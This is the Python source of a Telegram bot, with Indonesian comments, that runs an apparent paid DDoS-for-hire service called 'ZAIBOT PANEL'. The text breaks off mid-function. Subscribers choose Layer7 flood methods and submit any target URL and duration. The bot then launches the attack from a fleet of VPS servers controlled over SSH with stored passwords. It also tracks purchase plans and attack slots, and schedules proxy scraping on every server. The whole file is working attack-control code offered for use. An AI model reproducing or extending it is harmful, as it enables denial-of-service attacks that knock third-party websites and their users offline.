import telebot, requests, threading, time, datetime, paramiko, json, sys
import os, asyncio, socket, urllib.parse

from datetime import datetime
from colorama import Fore, init
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, BotCommand, InlineKeyboardMarkup, InlineKeyboardButton
from apscheduler.schedulers.background import BackgroundScheduler

#Function
from funcs.launch_attack import launch_attacks
from funcs.api_attack import launch_attack_api

#Command Handler
from Command.admin import AdminHandler
from Command.admin import is_target_blacklisted, blacklisted_targets
from Command.method import HandleMethod

def stop_attack_by_target(target_host):
    """Menghentikan attack hanya untuk target tertentu di semua VPS"""
    with open("./data/vps_servers.json") as f:
        vps_list = json.load(f)
    
    # Extract domain dari URL
    if target_host.startswith("http://"):
        domain = target_host.split("http://")[1].split("/")[0]
    elif target_host.startswith("https://"):
        domain = target_host.split("https://")[1].split("/")[0]
    else:
        domain = target_host
    
    results = []
    for vps in vps_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(vps['hostname'], username=vps['username'], password=vps['password'], timeout=5)
            
            # Cari dan kill proses berdasarkan domain target
            cmd = f"ps aux | grep -E 'node.*{domain}' | grep -v grep | awk '{{print $2}}' | xargs kill -9 2>/dev/null"
            ssh.exec_command(cmd)
            ssh.close()
            results.append(f"✅ {vps['hostname']}: Stopped attack to {domain}")
        except Exception as e:
            results.append(f"❌ {vps['hostname']}: {str(e)}")
    
    return results

def read_blacklisted_targets():
  try:
    with open('blacklist.txt', 'r') as f:
      lines = f.readlines()
      for line in lines:
        if line.strip():
          blacklisted_targets.add(line.strip())
  except FileNotFoundError:
      pass
        
try:
  with open('./config.json', 'r') as f:
    config = json.load(f)
except FileNotFoundError:
  config = {}
  
bot = telebot.TeleBot(config['TOKEN'])

#Module
scheduler = BackgroundScheduler()
cmd_admin = AdminHandler(bot)
show_method = HandleMethod(bot)

commands = [
    BotCommand(command='menu', description='Tampilkan menu utama'),
    BotCommand(command='attack', description='For attack server'),
    BotCommand(command='channels', description='Lihat channel kami'),
    BotCommand(command='logattack', description='Lihat 5 target terakhir'),
    ]
bot.set_my_commands(commands)

#Variable
selected_attack = {}
cooldowns = {}
successful_attacks = []
user_attack_slots = {}  # {user_id: current_slots} - tracking slot per user
active_targets = {}
last_target_input = {}
terminate_threads = {}

#Open Data
with open("./data/vps_servers.json") as file:
  vps_list = json.load(file)
  
with open("./data/methods.json") as e:
  data_met = json.load(e)
  
with open("./data/admin.json") as e:
  admin = json.load(e)
  admins = admin["admin"]
  
layer7_methods = []
layer4_methods = []

for layer in data_met['methods']:
  for type in data_met['methods'][layer]:
    if layer == 'layer7':
      layer7_methods.extend(data_met['methods'][layer][type])
    elif layer == 'layer4':
      layer4_methods.extend(data_met['methods'][layer][type])

layer7_methods = list(set(method.upper() for method in layer7_methods))
layer4_methods = list(set(method.upper() for method in layer4_methods))

# URL GIF untuk attack - Gunakan link GIF kamu
ATTACK_GIF_URL = "https://yourimageshare.com/ib/JsbA7YY705.gif"

def get_total_users():
    """Menghitung total user terdaftar"""
    try:
        with open("./data/database.json", "r") as file:
            data = json.load(file)
        return len(data.get('userid', {}))
    except:
        return 0

def get_total_trx():
    """Menghitung total transaksi sukses (contoh: dari attack)"""
    return len(successful_attacks)

def create_menu_keyboard():
    """Membuat keyboard untuk menu utama - HANYA TOMBOL ATTACK"""
    markup = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    btn_attack = KeyboardButton('⚔️ ATTACK')
    markup.add(btn_attack)
    return markup

def create_attack_keyboard():
    """Membuat keyboard dengan tombol-tombol attack"""
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_layer7_vip = KeyboardButton('Layer7-VIP')
    btn_layer7_basic = KeyboardButton('Layer7-Basic')
    btn_stop = KeyboardButton('🛑 Stop')
    btn_cancel = KeyboardButton('❌ Cancel')
    btn_menu = KeyboardButton('🏠 Menu Utama')
    markup.row(btn_layer7_vip, btn_layer7_basic)
    markup.row(btn_stop, btn_cancel)
    markup.row(btn_menu)
    return markup

def create_checkhost_button(host):
    """Membuat inline keyboard dengan tombol Check Host"""
    markup = InlineKeyboardMarkup()
    
    # Extract domain from URL
    if host.startswith("http://"):
        domain = host.split("http://")[1].split("/")[0]
    elif host.startswith("https://"):
        domain = host.split("https://")[1].split("/")[0]
    else:
        domain = host
    
    # Encode domain untuk URL
    encoded_domain = urllib.parse.quote(domain)
    
    # Buat URL check-host.net
    check_url = f"https://check-host.net/check-http?host=https://{encoded_domain}"
    
    # Buat tombol
    button = InlineKeyboardButton(
        text="🔍 Check Host Status", 
        url=check_url
    )
    markup.add(button)
    
    return markup

def send_attack_gif(chat_id, caption, reply_markup=None):
    """Mengirim GIF attack dengan caption"""
    try:
        # Coba kirim animation (GIF)
        bot.send_animation(
            chat_id,
            ATTACK_GIF_URL,
            caption=caption,
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
    except Exception as e:
        # Fallback ke teks biasa jika GIF gagal
        print(f"GIF failed: {e}")
        bot.send_message(
            chat_id,
            caption,
            parse_mode="Markdown",
            reply_markup=reply_markup
        )

def check_vps_connection(vps_address, username, password, timeout=5):
  try:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(vps_address, username=username, password=password, timeout=timeout)
    ssh.close()
    return True
  except paramiko.AuthenticationException:
    return False
  except paramiko.SSHException:
    return False
  except TimeoutError:
    return False
    
def check_username(chat_id):
  try:
    chat_member = bot.get_chat_member(chat_id, chat_id)
    username = chat_member.user.username
    return f"{username}"
  except Exception as e:
    return f"Error: {e}"
        
def is_valid_userid(user_id):
    with open("./data/database.json", "r") as file:
        data = json.load(file)
        
    userid = str(user_id)
    if userid not in data['userid']:
      return False
    
    if userid in data['userid']:
        if datetime.strptime(data['userid'][userid]['exp'], '%Y-%m-%d') < datetime.now():
            del data['userid'][userid]
            
            with open("./data/database.json", "w") as file:
                json.dump(data, file, indent=4)
                
            return False
        else:
            return True
    else:
        return False

def get_ip_info(url):
    try:
      r = requests.get(f"http://ip-api.com/json/{url}?fields=33292287")
      r.raise_for_status()
      res = r.json()
      if 'isp' not in res or 'country' not in res:
        raise ValueError("ISP atau Country tidak ditemukan dalam respons.")
      return res['isp'], res['country']
    except (requests.RequestException, ValueError):
        return None, None

# Handler untuk semua jenis media (foto, GIF, video, dokumen, sticker)
@bot.message_handler(content_types=['photo', 'animation', 'video', 'document', 'sticker', 'audio', 'voice'])
def handle_all_media(message):
    """Handler untuk menangani dan menghapus semua jenis media termasuk GIF"""
    try:
        media_type = message.content_type
        media_name = {
            'photo': 'Foto',
            'animation': 'GIF',
            'video': 'Video',
            'document': 'Dokumen',
            'sticker': 'Stiker',
            'audio': 'Audio',
            'voice': 'Voice'
        }.get(media_type, 'Media')
        
        # Hapus media
        bot.delete_message(message.chat.id, message.message_id)
        
        # Kirim pesan peringatan
        warning_msg = bot.send_message(
            message.chat.id, 
            f"❌ {media_name} tidak diizinkan. Harap kirim pesan teks saja."
        )
        
        # Hapus pesan peringatan setelah 3 detik
        threading.Timer(3.0, lambda: delete_message_safe(warning_msg.chat.id, warning_msg.message_id)).start()
        
    except Exception as e:
        print(f"Error handling media: {e}")

def delete_message_safe(chat_id, message_id):
    """Menghapus pesan dengan aman (menangani error)"""
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass

@bot.message_handler(commands=['start', 'menu'])
def menu_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Tidak ada username"
    first_name = message.from_user.first_name or "Tidak ada nama"
    
    with open("./data/database.json", "r") as file:
        db = json.load(file)
    
    # Cek apakah user terdaftar dan ambil expiry
    userid = str(user_id)
    if userid in db['userid']:
        terdaftar = "Yes ✅"
    else:
        terdaftar = "No ❌"
    
    total_users = get_total_users()
    total_trx = get_total_trx()
    
    caption = f"""
╭━━━〔 🚀 ZAIBOT PANEL 〕━━━╮

👤 USER INFO
━━━━━━━━━━━━━━━━━━━━
🆔 ID        : `{user_id}`
👤 Username  : @{username}
📛 Name      : {first_name}
✅ Registered : {terdaftar}

⚡ COMMAND MENU
━━━━━━━━━━━━━━━━━━━━
🔹 /methods
🔹 /myplans
🔹 /running
🔹 /channels
🔹 /logattack
🔹 /stop

📊 BOT STATS
━━━━━━━━━━━━━━━━━━━━
👥 Users : {total_users}
🛡 Admin : @zaibuzaiii
    """
    
    send_attack_gif(message.chat.id, caption, reply_markup=create_menu_keyboard())
        
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    with open("./data/database.json", "r") as file:
        db = json.load(file)
    
    if not is_valid_userid(user_id):
        bot.reply_to(message, 'You havent purchased a plan yet.')
        return

    info = db['userid'][str(user_id)]
    max_cons = info['maxCons']  # Slot maksimal untuk user ini
    
    # Inisialisasi slot user jika belum ada
    if user_id not in user_attack_slots:
        user_attack_slots[user_id] = 0
    
    # Cek apakah user masih punya slot
    if user_attack_slots[user_id] >= max_cons:
        bot.reply_to(message, f"❌ Slot penuh! Maksimal {max_cons} serangan bersamaan. Gunakan /running atau /stop untuk menghentikan serangan.")
        return
    
    # Tampilkan menu layer
    show_method.show_layer(message.chat.id)

# Handler untuk tombol ATTACK (SATU-SATUNYA TOMBOL DI MENU)
@bot.message_handler(func=lambda message: message.text == '⚔️ ATTACK')
def handle_attack_button(message):
    handle_attack_command(message)

# Handler untuk tombol Menu Utama (dari dalam attack menu)
@bot.message_handler(func=lambda message: message.text == '🏠 Menu Utama')
def handle_main_menu(message):
    menu_command(message)

# Handler untuk command /channels
@bot.message_handler(commands=['channels'])
def channels_command(message):
    """Menampilkan daftar channel"""
    channels_text = """
📢 **CHANNEL KAMI** 📢

🔹 @zaiiservice
🔹 @zaiddoser
🔹 @zaiproof

📌 Join channel di atas untuk update terbaru!
    """
    
    bot.reply_to(message, channels_text, parse_mode="Markdown")

# Handler untuk command /logattack
@bot.message_handler(commands=['logattack'])
def logattack_command(message):
    """Menampilkan 5 target attack terakhir user"""
    user_id = message.from_user.id
    
    # Filter attack milik user ini
    user_attacks = [attack for attack in successful_attacks if attack["user_id"] == user_id]
    
    if not user_attacks:
        bot.reply_to(message, "📊 **Kamu belum melakukan attack apapun.**", parse_mode="Markdown")
        return
    
    # Ambil 5 attack terakhir (sorted by time descending)
    recent_attacks = sorted(user_attacks, key=lambda x: x['time'], reverse=True)[:5]
    
    log_text = "📊 **5 TARGET TERAKHIR** 📊\n\n"
    
    for i, attack in enumerate(recent_attacks, 1):
        host = attack['host']
        log_text += f"{i}. `{host}`\n"
    
    bot.reply_to(message, log_text, parse_mode="Markdown")

def remove_target(host, times, message, user_id):
    terminate_threads[host] = False
    start_time = time.time()
    while not terminate_threads[host]:
        if time.time() - start_time >= times:
            break
    time.sleep(1)
    send_completion_message(message, host, user_id)

def decrease_slots(user_id):
    """Mengurangi slot untuk user tertentu"""
    if user_id in user_attack_slots and user_attack_slots[user_id] > 0:
        user_attack_slots[user_id] -= 1
        current_slots = user_attack_slots[user_id]
        print(f'Slot decreased for user {user_id}. User slots in use: {current_slots}')
        
        # Hapus job scheduler jika slot user menjadi 0 (opsional)
        if current_slots == 0:
            try:
                scheduler.remove_job(f"decrease_{user_id}")
            except:
                pass
    
def send_completion_message(message, host, user_id):
    chat_id = message.chat.id
    # Buat tombol Check Host untuk pesan selesai
    checkhost_button = create_checkhost_button(host)
    
    current_slots = user_attack_slots.get(user_id, 0)
    
    # Ambil maxCons user
    with open("./data/database.json", "r") as file:
        db = json.load(file)
    info = db['userid'].get(str(user_id), {})
    max_cons = info.get('maxCons', 0)
    
    bot.send_message(
        chat_id, 
        f"""**Attack-finished**
**├ Attack has finished**
**├ Your Slots : {current_slots}/{max_cons}**
**└ Last use by : @{check_username(message.from_user.id)}**
        """, 
        parse_mode='Markdown',
        reply_markup=checkhost_button
    )
    
# ========== COMMAND /stop ==========
@bot.message_handler(commands=['stop'])
def handle_stop_command(message):
    """Handler untuk command /stop - sama seperti tombol Stop"""
    user_id = message.from_user.id
    
    # Cari semua serangan user yang masih running
    user_attacks = []
    for attack in successful_attacks[:]:
        if attack["user_id"] == user_id:
            start_time = datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')
            duration = int(attack["duration"])
            remaining = duration - (datetime.now() - start_time).total_seconds()
            if remaining > 0:
                user_attacks.append(attack)
    
    if not user_attacks:
        bot.reply_to(message, "❌ Tidak ada serangan yang sedang berjalan.\n\nGunakan /running untuk cek serangan aktif.")
        return
    
    # Buat tombol pilihan
    markup = InlineKeyboardMarkup(row_width=1)
    for i, attack in enumerate(user_attacks, 1):
        host = attack['host']
        method = attack['method']
        start_time = datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')
        duration = int(attack["duration"])
        remaining = int(duration - (datetime.now() - start_time).total_seconds())
        
        short_host = host[:35] + "..." if len(host) > 35 else host
        markup.add(InlineKeyboardButton(f"⏹️ {i}. {short_host} ({method}) - sisa {remaining}s", callback_data=f"stop_{user_id}_{i}"))
    
    markup.add(InlineKeyboardButton("❌ Tutup", callback_data="stop_cancel"))
    bot.reply_to(message, "🎯 Pilih serangan yang ingin dihentikan:", reply_markup=markup)

#Handle Stop - PILIH SERANGAN DARI DAFTAR
@bot.message_handler(func=lambda message: message.text == '🛑 Stop')
def handle_selection_stop(message):
    user_id = message.from_user.id
    
    # Cari semua serangan user yang masih running
    user_attacks = []
    for attack in successful_attacks[:]:
        if attack["user_id"] == user_id:
            start_time = datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')
            duration = int(attack["duration"])
            remaining = duration - (datetime.now() - start_time).total_seconds()
            if remaining > 0:
                user_attacks.append(attack)
    
    if not user_attacks:
        bot.reply_to(message, "❌ Tidak ada serangan yang sedang berjalan.")
        return
    
    # Buat tombol pilihan
    markup = InlineKeyboardMarkup(row_width=1)
    for i, attack in enumerate(user_attacks, 1):
        host = attack['host']
        method = attack['method']
        start_time = datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')
        duration = int(attack["duration"])
        remaining = int(duration - (datetime.now() - start_time).total_seconds())
        
        short_host = host[:35] + "..." if len(host) > 35 else host
        markup.add(InlineKeyboardButton(f"⏹️ {i}. {short_host} ({method}) - sisa {remaining}s", callback_data=f"stop_{user_id}_{i}"))
    
    markup.add(InlineKeyboardButton("❌ Tutup", callback_data="stop_cancel"))
    bot.reply_to(message, "🎯 Pilih serangan yang ingin dihentikan:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def handle_stop_callback(call):
    if call.data == "stop_cancel":
        bot.edit_message_text("❌ Dibatalkan.", call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return
    
    parts = call.data.split('_')
    if len(parts) >= 3:
        user_id = int(parts[1])
        idx = int(parts[2])
        
        if call.from_user.id != user_id:
            bot.answer_callback_query(call.id, "❌ Bukan serangan kamu!", show_alert=True)
            return
        
        # Ambil daftar serangan user
        user_attacks = []
        for attack in successful_attacks[:]:
            if attack["user_id"] == user_id:
                start_time = datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')
                duration = int(attack["duration"])
                remaining = duration - (datetime.now() - start_time).total_seconds()
                if remaining > 0:
                    user_attacks.append(attack)
        
        if 1 <= idx <= len(user_attacks):
            attack = user_attacks[idx-1]
            host = attack['host']
            port = attack['port']
            
            # Hentikan serangan di VPS
            stop_attack_by_target(host)
            
            # Hapus dari list
            if attack in successful_attacks:
                successful_attacks.remove(attack)
            
            if host in terminate_threads:
                terminate_threads[host] = True
            
            # Kurangi slot untuk user ini
            if user_id in user_attack_slots and user_attack_slots[user_id] > 0:
                user_attack_slots[user_id] -= 1
                scheduler.add_job(lambda: None, 'interval', seconds=1)  # dummy job
            
            # Kirim pesan simpel tanpa hasil VPS
            bot.edit_message_text(f"✅ Serangan ke **{host}** telah dihentikan!", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
            bot.answer_callback_query(call.id, f"Serangan ke {host} dihentikan!")
        else:
            bot.answer_callback_query(call.id, "⚠️ Serangan tidak ditemukan.")

#Handle Cancel
@bot.message_handler(func=lambda message: message.text == '❌ Cancel')
def handle_cancel7(message):
  bot.reply_to(message, 'Cancelled', reply_markup=telebot.types.ReplyKeyboardRemove())
    
#Handle Layer7
@bot.message_handler(func=lambda message: message.text == 'Layer7-VIP')
def handle_selection(message):
  user_id = message.from_user.id
  with open("./data/database.json", "r") as file:
    db = json.load(file)
    
  info = db['userid'][str(user_id)]
  user_plan = info.get('plans', ' ')
  
  show_method.layer7_vip(message.chat.id)
    
@bot.message_handler(func=lambda message: message.text.upper() in [m.upper() for m in layer7_methods])
def handle_method_selection(message):
    user_id = message.from_user.id
    selected_method = message.text.upper()
    selected_attack[user_id] = selected_method
    bot.reply_to(message, '🎯 **Enter target and duration**\n\nFormat: `https://example.com 60`\nExample: `https://target.com 3600`', parse_mode='Markdown')
    bot.register_next_step_handler(message, handle_attack_layer7)

def handle_attack_layer7(message):
    user_id = message.from_user.id
    with open("./data/database.json", "r") as file:
        db = json.load(file)
        
    try:
        info = db['userid'][str(user_id)]
        max_duration = info['maxTime']
        max_cons = info['maxCons']
    except KeyError:
        bot.reply_to(message, "❌ You don't have an active plan.")
        return

    texts = message.text.split(' ')
    if len(texts) != 2:
        bot.reply_to(message, '❌ Invalid format!\nExample: `https://example.com 60`\n\nPlease select method again.', parse_mode='Markdown')
        return

    host = str(texts[0].strip())
    times = int(texts[1].strip())
    method = selected_attack.get(message.chat.id)
    
    if not method:
        bot.reply_to(message, '❌ Please select a method first via /attack menu.')
        return

    if user_id not in admins:
        if is_target_blacklisted(host):
            bot.reply_to(message, f'❌ {host} has been blacklisted!')
            return

    if 'http://' in host:
        port = '80'
    elif 'https://' in host:
        port = '443'
    else:
        bot.reply_to(message, '❌ Invalid URL! Use http:// or https://')
        return

    if times > max_duration:
        bot.reply_to(message, f'❌ Your maximum attack duration is {max_duration} seconds. Please use less time or upgrade your plan.')
        return
      
    if host.startswith("http://"):
        url = host.split("http://")[1].split("/")[0]
    elif host.startswith("https://"):
        url = host.split("https://")[1].split("/")[0]
    else:
        url = host
        
    isp, country = get_ip_info(url)
    if isp is None or country is None:
        bot.reply_to(message, "❌ Could not get ISP/Country info. Make sure the host is valid.", parse_mode="Markdown")
        return
    
    # Cek slot user
    if user_id not in user_attack_slots:
        user_attack_slots[user_id] = 0
    
    if user_attack_slots[user_id] >= max_cons:
        bot.reply_to(message, f"❌ Your {max_cons} slot(s) is FULL! Use /stop to stop an attack first.")
        return
    
    def start_attack():
         nonlocal times
         user_attack_slots[user_id] += 1
    
    # Buat dan start thread
    attack_thread = threading.Thread(target=remove_target, args=(host, times, message, user_id))
    active_targets[host] = attack_thread
    attack_thread.start()
    
    # Hapus job lama jika ada
    old_job_id = f"decrease_{user_id}_{host}"
    try:
        scheduler.remove_job(old_job_id)
    except:
        pass
    
    # Tambah job baru
    scheduler.add_job(lambda: decrease_slots(user_id), 'interval', seconds=times, id=old_job_id)

    current_slots = user_attack_slots.get(user_id, 0)
    print(f'Attack started by user {user_id} on {host}. User slots: {current_slots}/{max_cons}')
      
    start_attack()
    
    attack_info = {
        'host': host,
        'port': port,
        'duration': times,
        'method': method,
        'user_id': user_id,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    successful_attacks.append(attack_info)
    launch_attacks(method, host, port, str(times))
    
    checkhost_button = create_checkhost_button(host)
    current_slots = user_attack_slots.get(user_id, 0)
    
    attack_caption = f"""**Attack-launch-layer7**
**├ Target: {host}**
**├ Port: {port}**
**├ Time: {times}**
**├ Method: {method.upper()}**
**├ ISP: {isp}**
**├ Country: {country}**
**├ Your Slots: {current_slots}/{max_cons}**
**└ Attack use by: @{check_username(user_id)}**"""
    
    send_attack_gif(message.chat.id, attack_caption, checkhost_button)
    
    # ✅ BARIS INI YANG MEMPERBAIKI BUG - HAPUS method setelah attack
    if message.chat.id in selected_attack:
        del selected_attack[message.chat.id]

@bot.message_handler(func=lambda message: message.text == 'Layer7-Basic')
def handle_selection_basic(message):
  user_id = message.from_user.id
  with open("./data/database.json", "r") as file:
    db = json.load(file)
    
  info = db['userid'][str(user_id)]
  user_plan = info.get('plans', ' ')
  
  show_method.layer7_basic(message.chat.id)


"""
COMMAND
"""
@bot.message_handler(commands=['methods'])
def method_menu(message):
  ha = data_met['methods']
  mes = "List Methods:\n"
    
  mes += "Basic Layer7:\n"
  for basic in ha["layer7"]["basic"]:
    mes += f"- {basic}\n"
    
  mes += "VIP Layer7:\n"
  for vip in ha["layer7"]["vip"]:
    mes += f"- {vip}\n"
        
  bot.reply_to(message, mes)
  
@bot.message_handler(commands=['myplans'])
def my_plans(message):
  global is_valid_userid
  user_id = message.from_user.id
  userid = str(user_id)
  with open("./data/database.json", "r") as file:
    db = json.load(file)
  
  info = db.get('userid', {}).get(userid, None)
  if info:
    username = check_username(user_id) or f'Unknown user {user_id}'
    expiry_date = datetime.strptime(info['exp'], '%Y-%m-%d')
    expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        
    max_duration_str = str(info['maxTime'])
    max_cons = info['maxCons']
    plans = str(info["plans"])
        
    bot.reply_to(message, f'Plan details for @{username}\nUser ID: {user_id}\nExpire Time: {expiry_date_str}\nMax Time: {max_duration_str} seconds\nMax Cons: {max_cons}\nPlans: {plans.upper()}')
  else:
    bot.reply_to(message, 'You havent purchased a plan yet.')
  
@bot.message_handler(commands=['myid'])
def my_id(message):
  user_id = message.from_user.id
  bot.reply_to(message, f"Your id is : {user_id}")

@bot.message_handler(commands=['running'])
def handle_running_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_valid_userid(user_id):
        bot.send_message(chat_id, 'You havent purchased a plan yet.')
        return
    
    user_attacks = [attack for attack in successful_attacks if attack["user_id"] == user_id]

    if not user_attacks:
        bot.send_message(chat_id, 'You do not have any running attacks.')
        return

    message_text = ''
    
    for attack in user_attacks[:]:
        host = attack["host"]
        port = attack["port"]
        duration = int(attack["duration"])
        method = attack["method"]
        start_time = datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')
        
        remaining_time = duration - (datetime.now() - start_time).total_seconds()
        if remaining_time > 0:
            remaining_time_str = f'{int(remaining_time)} seconds'
            message_text += (
                f'Target: {host}\n'
                f'Port: {port}\n'
                f'Time Remaining: {remaining_time_str}\n'
                f'Method: {method}\n\n'
            )
        else:
            successful_attacks.remove(attack)

    if message_text:
        bot.send_message(chat_id, message_text)
    else:
        bot.send_message(chat_id, 'No active attacks.')

"""
ADMINS COMMANDS
"""
@bot.message_handler(commands=['showrunning'])
def handle_running_admin_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if user_id not in admins:
        bot.send_message(chat_id, 'You do not have admin access.')
        return
    
    if len(successful_attacks) == 0:
        bot.send_message(chat_id, 'Nobody has carried out an attack.')
        return
    
    message_text = ''
    attacks_found = False
    
    for attack in successful_attacks[:]:
        attacker_id = attack["user_id"]
        username = check_username(attacker_id)
        host = attack["host"]
        port = attack["port"]
        duration = int(attack["duration"])
        method = attack["method"]
        start_time = datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')
        
        remaining_time = duration - (datetime.now() - start_time).total_seconds()
        if remaining_time > 0:
            attacks_found = True
            remaining_time_str = f'{int(remaining_time)} seconds'
            message_text += (
                f'Username: @{username}\n'
                f'User ID: {attacker_id}\n'
                f'Target: {host}\n'
                f'Port: {port}\n'
                f'Time Remaining: {remaining_time_str}\n'
                f'Method: {method}\n\n'
            )
        else:
            successful_attacks.remove(attack)
    
    if attacks_found and message_text:
        bot.send_message(chat_id, message_text)
    else:
        bot.send_message(chat_id, 'Nobody has a running attack.')

def execute_killall(vps):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps["hostname"], username=vps["username"], password=vps["password"])
        
        command = "killall node"
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        
        client.close()
        return f"✅ {vps['hostname']}: Semua proses Node.js dihentikan.\n{output}" if not error else f"⚠️ {vps['hostname']}: {error}"
    except Exception as e:
        return f"❌ {vps['hostname']}: Gagal terhubung - {str(e)}"

@bot.message_handler(commands=['pkill'])
def kill_node_command(message):
    user_id = message.from_user.id
    if user_id not in admins:
        bot.reply_to(message, "🚫 Anda tidak memiliki akses admin.")
        return

    bot.reply_to(message, "🔄 Menghentikan semua proses Node.js di semua VPS...")

    results = [execute_killall(vps) for vps in vps_list]
    
    bot.reply_to(message, "\n".join(results))
        
@bot.message_handler(commands=['admin'])
def help_admin(message):
  cmd_admin.helpadmin(message)
  
@bot.message_handler(commands=['blacklist'])
def blacklist(message):
  cmd_admin.blacklist(message)
  
@bot.message_handler(commands=['unblacklist'])
def unblacklist(message):
  cmd_admin.unblacklist(message)
  
@bot.message_handler(commands=['listblacklist'])
def listblacklist(message):
  cmd_admin.listblacklist(message)
  
@bot.message_handler(commands=['addplans'])
def add_plans(message):
  cmd_admin.addplans(message)

@bot.message_handler(commands=['removeplans'])
def remove_plans(message):
  cmd_admin.removeplans(message)

@bot.message_handler(commands=['userlist'])
def user_list(message):
  cmd_admin.userlist(message)

@bot.message_handler(commands=['addserver'])
def add_server(message):
  cmd_admin.addserver(message)

@bot.message_handler(commands=['updateplans'])
def update_user(message):
  cmd_admin.updateuser(message)
  
@bot.message_handler(commands=['server'])
def check_server(message):
    user_id = message.from_user.id
    if user_id not in admins:
        bot.reply_to(message, 'You do not have admin access.')
        return
    
    connected_count = 0
    server_status = "Checking all VPS status...\n\n"
    
    for vps in vps_list:
        vps_connection_status = check_vps_connection(vps['hostname'], vps['username'], vps['password'])
        if vps_connection_status:
            connected_count += 1
            cpu_usage = get_cpu_usage(vps['hostname'], vps['username'], vps['password'])
            server_status += f"VPS {connected_count} (CPU: {cpu_usage}%) 🟢 Alive\n"
        else:
            server_status += f"VPS {vps['hostname']} (CPU: N/A) 🔴 Dead\n"
    
    server_status += f"\nTotal servers connected: {connected_count}"
    bot.reply_to(message, server_status)

def get_cpu_usage(hostname, username, password):
  try:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname, username=username, password=password)
    stdin, stdout, stderr = client.exec_command("top -bn1 | grep 'Cpu(s)'")
    cpu_line = stdout.read().decode().strip()
    client.close()
    if cpu_line:
      idle_str = [x for x in cpu_line.split(',') if 'id' in x][0]
      idle_percentage = float(idle_str.split()[0])
      active_cpu_usage = 100.0 - idle_percentage
      return round(active_cpu_usage, 2)
    return "N/A"
  except Exception as e:
    print(f"Failed to get CPU usage for {hostname}: {e}")
    return "N/A"

# ========== AUTO SCRAPE SCHEDULER ==========
auto_scrape_jobs = {}  # {chat_id: job_id}

def run_scrape_on_all_vps(chat_id):
    """Jalankan scrape.py di semua VPS"""
    try:
        with open("./data/vps_servers.json", "r") as f:
            vps_list = json.load(f)
        
        results = []
        success_count = 0
        
        for vps in vps_list:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    vps['hostname'], 
                    username=vps['username'], 
                    password=vps['password'], 
                    timeout=10
                )
                
                # Jalankan scrape.py di background
                cmd = "cd /root/methods && python3 scrape.py > /tmp/scrape.log 2>&1 &"
                ssh.exec_command(cmd)
                
                success_count += 1
                results.append(f"✅ {vps['hostname']}")
                ssh.close()
                
            except Exception as e:
                results.append(f"❌ {vps['hostname']}: {str(e)[:30]}")
        
        # Kirim laporan
        bot.send_message(
            chat_id,
            f"🔄 **Auto Scrape**\n\n" + 
            "\n".join(results) +
            f"\n\n✅ Sukses: {success_count}/{len(vps_list)} VPS\n"
            f"📁 Hasil: `/root/methods/proxy.txt`\n"
            f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['autoscrape'])
def auto_scrape_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    with open("./data/admin.json", "r") as e:
        admin = json.load(e)
        admins = admin["admin"]
    
    if user_id not in admins:
        bot.reply_to(message, "🚫 Akses ditolak.")
        return
    
    args = message.text.split()
    
    # /autoscrape off -> matikan
    if len(args) == 2 and args[1].lower() == 'off':
        if chat_id in auto_scrape_jobs:
            try:
                scheduler.remove_job(auto_scrape_jobs[chat_id])
                del auto_scrape_jobs[chat_id]
                bot.reply_to(message, "✅ **Auto scrape dimatikan!**", parse_mode='Markdown')
            except:
                bot.reply_to(message, "⚠️ Gagal mematikan auto scrape.")
        else:
            bot.reply_to(message, "⚠️ Tidak ada auto scrape yang berjalan.")
        return
    
    # /autoscrape <detik>
    if len(args) != 2:
        bot.reply_to(
            message,
            "❌ **Format salah!**\n\n"
            "`/autoscrape <detik>` - Mulai auto scrape\n"
            "`/autoscrape off` - Matikan auto scrape\n\n"
            "**Contoh:**\n"
            "`/autoscrape 3600` - Setiap 1 jam\n"
            "`/autoscrape 86400` - Setiap 24 jam",
            parse_mode='Markdown'
        )
        return
    
    try:
        interval = int(args[1])
        
        if interval < 60:
            bot.reply_to(message, "⚠️ Minimal interval adalah 60 detik.")
            return
        
        # Hapus job lama jika ada
        if chat_id in auto_scrape_jobs:
            try:
                scheduler.remove_job(auto_scrape_jobs[chat_id])
            except:
                pass
        
        # Tambah job baru
        job = scheduler.add_job(
            func=lambda: run_scrape_on_all_vps(chat_id),
            trigger='interval',
            seconds=interval,
            id=f"auto_scrape_{chat_id}"
        )
        
        auto_scrape_jobs[chat_id] = job.id
        
        # Konversi interval ke format mudah dibaca
